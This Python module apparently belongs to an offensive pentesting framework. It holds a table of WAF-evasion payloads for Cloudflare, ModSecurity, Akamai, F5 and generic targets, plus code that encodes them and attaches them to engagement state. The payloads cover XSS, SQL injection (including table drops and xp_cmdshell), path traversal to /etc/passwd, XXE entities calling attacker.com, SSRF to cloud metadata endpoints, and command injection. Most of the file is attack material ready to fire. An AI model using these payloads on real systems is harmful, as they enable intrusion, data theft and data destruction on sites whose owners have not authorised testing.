"""
WAF Bypass Module — WAF-specific payloads with multiple encodings.
"""

import base64
from urllib.parse import quote, quote_plus
from core.orchestrator import EngagementState, Finding, Severity

# ── Encoding helpers ──────────────────────────────────────────────────────────

def url_encode(s: str) -> str:
    return quote(s, safe="")

def double_url_encode(s: str) -> str:
    return quote(quote(s, safe=""), safe="")

def html_entity_encode(s: str) -> str:
    return "".join(f"&#{ord(c)};" for c in s)

def unicode_encode(s: str) -> str:
    return "".join(f"\\u{ord(c):04x}" for c in s)

def base64_encode(s: str) -> str:
    return base64.b64encode(s.encode()).decode()

def mixed_case(s: str) -> str:
    return "".join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(s))


# ── Payload definitions ───────────────────────────────────────────────────────

WAF_PAYLOADS = {
    "Cloudflare": {
        "xss": [
            "<svg/onload=alert(1)>",
            "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>>",
            "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;49&#41;>",
            "<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>",
            "<details open ontoggle=alert(1)>",
            "<input onfocus=alert(1) autofocus>",
            "'-alert(1)-'",
            "\"><img src=1 onerror=alert(1)>",
        ],
        "sqli": [
            "' OR 1=1--",
            "' /*!50000OR*/ 1=1--",
            "' OR 'x'='x",
            "1' /*!AND*/ 1=1--",
            "' /*!UNION*/ /*!SELECT*/ 1,2,3--",
            "1' AND 1=1 #",
            "' OR 1=1 LIMIT 1 --",
        ],
        "lfi": [
            "....//....//....//etc//passwd",
            "..%252f..%252f..%252fetc%252fpasswd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
        ],
    },
    "ModSecurity": {
        "xss": [
            "<ScRiPt>alert(1)</ScRiPt>",
            "<img src=1 href=1 onerror=\"javascript:alert(1)\">",
            "<<SCRIPT>alert(1)//<</SCRIPT>",
            "<svg><script>alert&#40;1&#41;</script>",
            "<!--[if IE]><script>alert(1)</script><![endif]-->",
            "<object data=\"javascript:alert(1)\">",
        ],
        "sqli": [
            "' OR 1=1 #",
            "admin'--",
            "' UNION SELECT null,null--",
            "' OR '1'='1'/*",
            "1 AND 1=1/*",
            "1'; WAITFOR DELAY '0:0:5'--",
        ],
        "rce": [
            "; ls -la",
            "| whoami",
            "`id`",
            "$(id)",
            "; cat /etc/passwd",
            "& dir",
        ],
    },
    "Akamai": {
        "xss": [
            "<script>alert`1`</script>",
            "<img src onerror=alert(1)>",
            "<svg><animate onbegin=alert(1) attributeName=x>",
            "jaVasCript:alert(1)",
            "<a href=\"data:text/html,<script>alert(1)</script>\">",
        ],
        "sqli": [
            "' OR/**/1=1--",
            "' UNION/**/SELECT/**/1,2,3--",
            "';EXEC xp_cmdshell('whoami')--",
            "1 OR 1=1",
            "' OR 'unusual'='unusual",
        ],
    },
    "F5": {
        "xss": [
            "<script/x>alert(1)</script>",
            "<SCRIPT SRC=//xss.rocks></SCRIPT>",
            "<IMG SRC=\"javascript:alert(String.fromCharCode(88,83,83))\">",
            "%3cscript%3ealert(1)%3c/script%3e",
            "&#60;script&#62;alert(1)&#60;/script&#62;",
        ],
        "sqli": [
            "' OR 1--",
            "' OR 'a'='a",
            "; SELECT * FROM users--",
            "1' RLIKE 1--",
        ],
        "ssrf": [
            "http://169.254.169.254/",
            "http://[::1]/",
            "http://localhost/",
            "http://0.0.0.0/",
            "http://2130706433/",
        ],
    },
    "Generic": {
        "xss": [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "'\"><img src=x onerror=alert(document.domain)>",
            "<body onload=alert(1)>",
            "javascript:alert(1)",
            "<iframe src=javascript:alert(1)>",
            "<math><mtext></p><script>alert(1)</script>",
        ],
        "sqli": [
            "' OR '1'='1",
            "' OR 1=1--",
            "' UNION SELECT 1,2,3--",
            "1; DROP TABLE users--",
            "' AND SLEEP(5)--",
            "' AND 1=CONVERT(int,(SELECT TOP 1 name FROM sysobjects))--",
            "' OR EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--",
        ],
        "lfi": [
            "../../../../etc/passwd",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd",
            "/etc/passwd%00",
            "php://filter/convert.base64-encode/resource=/etc/passwd",
        ],
        "xxe": [
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/xxe">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe;]><foo/>',
        ],
        "ssrf": [
            "http://127.0.0.1:80",
            "http://localhost/admin",
            "http://169.254.169.254/latest/meta-data/",
            "http://[::1]:80",
            "http://0.0.0.0:80",
            "http://2130706433/",
            "file:///etc/passwd",
            "dict://localhost:6379/info",
        ],
        "rce": [
            "; id",
            "| id",
            "`id`",
            "$(id)",
            "; cat /etc/passwd",
            "& whoami",
            "\r\nid",
        ],
        "path_traversal": [
            "../../../../etc/passwd",
            "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%2F..%2Fetc%2Fpasswd",
            "..%5c..%5cwindows%5csystem32%5cdrivers%5cetc%5chosts",
        ],
    },
}


def get_payloads(waf_type: str, vuln_type: str, with_encodings: bool = True) -> list:
    """Get WAF bypass payloads for a specific WAF and vulnerability type."""
    waf_key = waf_type if waf_type in WAF_PAYLOADS else "Generic"
    vuln_type_lower = vuln_type.lower()

    payloads = WAF_PAYLOADS[waf_key].get(vuln_type_lower, [])
    if not payloads:
        payloads = WAF_PAYLOADS["Generic"].get(vuln_type_lower, [])

    if not with_encodings:
        return payloads

    encoded = list(payloads)
    for p in payloads[:3]:
        encoded.append(url_encode(p))
        encoded.append(double_url_encode(p))
        if vuln_type_lower == "xss":
            encoded.append(html_entity_encode(p))

    return encoded


async def generate_waf_bypass(waf_type: str, vuln_type: str) -> list:
    """AI-ready async wrapper for WAF bypass generation."""
    return get_payloads(waf_type, vuln_type)


def suggest_bypass_payloads(waf: str, vulns_detected: list) -> dict:
    """Given a WAF name and list of vuln types, return payloads per type."""
    result = {}
    vuln_types = vulns_detected or ["xss", "sqli", "lfi", "ssrf"]
    for vt in vuln_types:
        result[vt] = get_payloads(waf, vt)
    return result


async def run_waf_bypass_analysis(state: EngagementState, console=None) -> dict:
    """Analyze WAFs and attach bypass payloads to state.web_data."""
    def log(msg):
        if console:
            console.print(f"  [dim]→[/dim] {msg}")

    results = {}
    for port, wdata in state.web_data.items():
        waf = wdata.get("waf") or "Generic"
        log(f"Generating bypass payloads for {waf} WAF on port {port}...")
        payloads = suggest_bypass_payloads(waf, ["xss", "sqli", "lfi", "ssrf", "rce"])
        results[port] = {"waf": waf, "payloads": payloads}

        if waf != "Generic":
            state.add_finding(Finding(
                title=f"WAF Bypass Payloads Generated: {waf}",
                severity=Severity.INFO,
                description=f"WAF-specific bypass payloads generated for {waf} on port {port}.",
                evidence=f"Total payload variants: {sum(len(v) for v in payloads.values())}",
                mitre_tactic="Defense Evasion",
                mitre_technique="T1562.001 - Disable or Modify Tools",
                remediation="Test these payloads only in authorized engagements.",
                phase="web",
            ))

    if not hasattr(state, "waf_bypass_data"):
        state.waf_bypass_data = {}
    state.waf_bypass_data = results
    return results
